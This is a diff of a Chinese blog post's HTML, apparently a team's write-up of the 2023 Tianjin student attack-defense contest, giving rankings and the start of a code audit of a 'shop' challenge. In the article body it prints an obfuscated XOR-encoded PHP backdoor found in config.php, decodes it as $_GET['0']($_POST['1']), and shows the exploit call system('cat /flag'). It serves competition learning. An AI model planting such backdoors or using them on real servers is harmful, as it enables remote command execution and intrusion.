@@ -1,225 +1,395 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>天津市大学生信息安全网络攻防大赛 | lazy_forever's Blog</title><meta name="author" content="lazy_forever,2606090126@qq.com"><meta name="copyright" content="lazy_forever"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="介绍此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中： ① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放； ② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。 排名队伍名字 NKV DAWD攻防赛排名第一   应急响应排名第七   总分第一">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lazy_forever">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="介绍此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中： ① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放； ② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。 排名队伍名字 NKV DAWD攻防赛排名第一   应急响应排名第七   总分第一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="天津市大学生信息安全网络攻防大赛">
 <meta property="og:url" content="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/index.html">
 <meta property="og:site_name" content="lazy_forever&#39;s Blog">
 <meta property="og:description" content="介绍此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中： ① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放； ② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。 排名队伍名字 NKV DAWD攻防赛排名第一   应急响应排名第七   总分第一">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://datacon.qianxin.com/api/competitions/70/logo">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png">
 <meta property="article:published_time" content="2023-09-19T05:07:18.000Z">
 <meta property="article:modified_time" content="2023-11-05T14:44:09.673Z">
 <meta property="article:author" content="lazy_forever">
 <meta property="article:tag" content="rce">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="awd">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://datacon.qianxin.com/api/competitions/70/logo"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '天',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: {"limitCount":50,"languages":{"author":"作者: lazy_forever","link":"链接: ","source":"来源: lazy_forever's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>天津市大学生信息安全网络攻防大赛 - lazy_forever&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.lazyforever.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"84176b1e334c7f1956cee269aaaf9bb3","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: true,
-  },
-  autoDarkmode: true
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '天津市大学生信息安全网络攻防大赛',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2023-11-05 22:44:09'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
+
   
-    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
-      const link = document.createElement('link')
-      link.rel = 'stylesheet'
-      link.href = url
-      if (id) link.id = id
-      link.onerror = reject
-      link.onload = link.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        link.onload = link.onreadystatechange = null
-        resolve()
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?84176b1e334c7f1956cee269aaaf9bb3";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
       }
-      document.head.appendChild(link)
-    })
+    </script>
   
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
       }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="lazy_forever's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
     
-          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
-          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
-          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
-          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-          if (t === undefined) {
-            if (isLightMode) activateLightMode()
-            else if (isDarkMode) activateDarkMode()
-            else if (isNotSpecified || hasNoSupport) {
-              const now = new Date()
-              const hour = now.getHours()
-              const isNight = hour <= 6 || hour >= 23
-              isNight ? activateDarkMode() : activateLightMode()
-            }
-            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
-              if (saveToLocal.get('theme') === undefined) {
-                e.matches ? activateDarkMode() : activateLightMode()
-              }
-            })
-          } else if (t === 'light') activateLightMode()
-          else activateDarkMode()
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lazy_forever</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="天津市大学生信息安全网络攻防大赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
     
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="lazy_forever's Blog" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> envelope</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://datacon.qianxin.com/api/competitions/70/logo')"><nav id="nav"><span id="blog-info"><a href="/" title="lazy_forever's Blog"><span class="site-name">lazy_forever's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> envelope</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">天津市大学生信息安全网络攻防大赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-19T05:07:18.000Z" title="发表于 2023-09-19 13:07:18">2023-09-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-05T14:44:09.673Z" title="更新于 2023-11-05 22:44:09">2023-11-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/awd/">awd</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="天津市大学生信息安全网络攻防大赛"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：</p>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        lazy_forever
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-19 13:07" pubdate>
+          2023年9月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">天津市大学生信息安全网络攻防大赛</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：1 个月前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：</p>
 <p>① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放；</p>
 <p>② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。</p>
 <h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>队伍名字 NKV</p>
 <p>DAWD攻防赛排名第一</p>
-<img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" class="">
+<img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>应急响应排名第七</p>
-<img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" class="">
+<img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>总分第一</p>
 <h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>dawd的shop题目我们审计出了两个漏洞</p>
 <p>第一个是在&#x2F;config&#x2F;config.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line"></span><br><span class="line">$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$___</span>&#125;[<span class="variable">$_</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-variable">$_</span>++;<br><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&quot;`&quot;</span>^<span class="hljs-string">&quot;?&quot;</span>).(<span class="hljs-string">&quot;:&quot;</span>^<span class="hljs-string">&quot;&#125;&quot;</span>).(<span class="hljs-string">&quot;%&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;&#123;&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-variable">$___</span>=(<span class="hljs-string">&quot;$&quot;</span>^<span class="hljs-string">&quot;&#123;&quot;</span>).(<span class="hljs-string">&quot;~&quot;</span>^<span class="hljs-string">&quot;.&quot;</span>).(<span class="hljs-string">&quot;/&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;-&quot;</span>^<span class="hljs-string">&quot;~&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span>^<span class="hljs-string">&quot;|&quot;</span>);<br><br>$&#123;<span class="hljs-variable">$__</span>&#125;[!<span class="hljs-variable">$_</span>]($&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$_</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>一个明显的后门，相当于<code>$_GET[&#39;0&#39;]($_POST[&#39;1&#39;])</code></p>
 <p>直接<code>system(&#39;cat /flag&#39;)</code>就行</p>
 <p>另一个是在&#x2F;controller&#x2F;index.class.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ 